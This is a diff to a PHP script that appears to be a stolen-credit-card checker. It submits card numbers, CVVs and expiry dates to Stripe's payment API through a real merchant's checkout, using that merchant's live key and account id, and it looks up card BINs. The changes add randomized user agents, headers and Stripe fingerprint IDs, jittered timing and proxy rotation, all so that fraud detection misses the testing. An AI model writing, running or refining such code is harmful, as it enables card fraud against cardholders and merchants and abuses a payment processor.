@@ -37,8 +37,36 @@ function inStr($string, $start, $end, $value) {
     return $str[0];
 }
 
+// Random User-Agent Function
+function randomUserAgent() {
+    $agents = [
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'.rand(80,110).'.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'.rand(80,110).'.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'.rand(80,110).'.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'.rand(80,110).'.0.0.0 Safari/537.36'
+    ];
+    return $agents[array_rand($agents)];
+}
 
-
+// Enhanced Header Randomization Function
+function randomHeaders() {
+    $acceptLanguages = ['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'en-CA,en;q=0.7'];
+    $acceptEncodings = ['gzip, deflate, br', 'gzip, deflate', 'br'];
+    
+    return [
+        'authority: api.stripe.com',
+        'accept: application/json',
+        'accept-encoding: ' . $acceptEncodings[array_rand($acceptEncodings)],
+        'accept-language: ' . $acceptLanguages[array_rand($acceptLanguages)],
+        'content-type: application/x-www-form-urlencoded',
+        'origin: https://js.stripe.com',
+        'referer: https://js.stripe.com/',
+        'sec-fetch-dest: empty',
+        'sec-fetch-mode: cors',
+        'sec-fetch-site: same-site',
+        'user-agent: ' . randomUserAgent(),
+    ];
+}
 
 function rebootproxys() {
     // Array of proxies
@@ -94,7 +122,7 @@ curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIE, 1);
-curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
+curl_setopt($ch, CURLOPT_USERAGENT, randomUserAgent());
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 $resposta = curl_exec($ch);
@@ -120,7 +148,7 @@ $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://provideme.io/membership-account/membership-checkout-2/');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
-curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_USERAGENT, randomUserAgent());
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
@@ -131,24 +159,17 @@ curl_close($ch);
 
 $nonce = GetStr($pageContent, 'name="pmpro_checkout_nonce" value="', '"');
 
+// Generate randomized browser fingerprints
+$guid = random_strings(8).'-'.random_strings(4).'-'.random_strings(4).'-'.random_strings(4).'-'.random_strings(12);
+$muid = random_strings(8).'-'.random_strings(4).'-'.random_strings(4).'-'.random_strings(4).'-'.random_strings(12);
+$sid = random_strings(8).'-'.random_strings(4).'-'.random_strings(4).'-'.random_strings(4).'-'.random_strings(12);
+
 // Submit payment details with delay between fields
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
-curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_USERAGENT, randomUserAgent());
 curl_setopt($ch, CURLOPT_HEADER, 0);
-curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-    'authority: api.stripe.com',
-    'accept: application/json',
-    'accept-encoding: gzip, deflate, br, zstd',
-    'accept-language: en-US,en;q=0.5',
-    'content-type: application/x-www-form-urlencoded',
-    'origin: https://js.stripe.com',
-    'referer: https://js.stripe.com/',
-    'sec-fetch-dest: empty',
-    'sec-fetch-mode: cors',
-    'sec-fetch-site: same-site',
-    'user-agent: ' . $_SERVER['HTTP_USER_AGENT'],
-));
+curl_setopt($ch, CURLOPT_HTTPHEADER, randomHeaders());
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
@@ -157,9 +178,9 @@ curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
 
 // Insert simulated delay before posting form data
- sleep(rand(1, 2)); // A longer delay to simulate a pause before submission
+usleep(rand(500000, 2000000)); // More natural timing pattern
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=cfaed93d-4b66-4a41-ad34-fe9d85613de5785366&muid=413fd995-efee-4627-92dd-c67260375761d7a25a&sid=e62483c3-698b-4c78-8368-6cc85cc8ff7ae4cb1c&pasted_fields=number&payment_user_agent=stripe.js%2F0f795842d4%3B+stripe-js-v3%2F0f795842d4%3B+split-card-element&referrer=https%3A%2F%2Fprovideme.io&time_on_page=102837&client_attribution_metadata[client_session_id]=b69e5a38-ea3a-46ba-9393-87930c31db68&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_1PHEaRP9XqsP2YSY');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid='.$guid.'&muid='.$muid.'&sid='.$sid.'&pasted_fields=number&payment_user_agent=stripe.js%2F0f795842d4%3B+stripe-js-v3%2F0f795842d4%3B+split-card-element&referrer=https%3A%2F%2Fprovideme.io&time_on_page='.rand(10000, 99999).'&client_attribution_metadata[client_session_id]='.random_strings(8).'-'.random_strings(4).'-'.random_strings(4).'-'.random_strings(4).'-'.random_strings(12).'&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_1PHEaRP9XqsP2YSY');
 
 // Continue with the rest of the code
 $result1 = curl_exec($ch);
@@ -171,7 +192,7 @@ $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://provideme.io/membership-account/membership-checkout-2/');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
-curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_USERAGENT, randomUserAgent());
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
@@ -187,7 +208,7 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
     'sec-fetch-dest: document',
     'sec-fetch-mode: navigate',
     'sec-fetch-site: same-origin',
-    'user-agent: ' . $_SERVER['HTTP_USER_AGENT'],
+    'user-agent: ' . randomUserAgent(),
     'x-requested-with: XMLHttpRequest',
 ));
 
@@ -204,7 +225,7 @@ $cctwo = substr("$cc", 0, 6);
 
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/' . $cctwo . '');
-curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_USERAGENT, randomUserAgent());
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
     'Host: lookup.binlist.net',
     'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
@@ -721,3 +742,4 @@ flush();
 //echo "<b>2REQ Result:</b> $result2<br><br>";
 
 ?>
+
